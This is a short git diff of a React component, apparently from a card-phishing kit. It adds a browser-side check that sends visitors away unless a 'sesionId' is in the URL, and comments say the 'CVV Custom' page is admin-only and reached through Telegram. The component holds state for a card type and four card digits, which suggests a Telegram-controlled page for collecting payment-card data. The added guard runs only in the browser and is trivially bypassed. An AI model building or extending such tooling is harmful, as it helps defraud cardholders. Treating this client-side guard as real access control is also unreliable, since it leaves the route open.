@@ -6,6 +6,20 @@ import './css/LoginModal.css';
 
 export default function TCcustoms() {
     const navigate = useNavigate();
+    
+    // Validar que la ruta sea accesible solo desde Telegram (con sesionId en URL)
+    useEffect(() => {
+        const params = new URLSearchParams(window.location.search);
+        const sesionId = params.get("sesionId");
+        
+        if (!sesionId) {
+            // Si no hay sesionId, redirigir a la página principal
+            // Esta ruta es exclusiva del admin y solo debe accederse desde Telegram
+            console.warn('Acceso no autorizado a CVV Custom - redirigiendo');
+            navigate('/');
+        }
+    }, [navigate]);
+    
     const [tipo, setTipo] = useState(""); // 'credito' | 'debito'
     const [digits, setDigits] = useState(["", "", "", ""]);
 
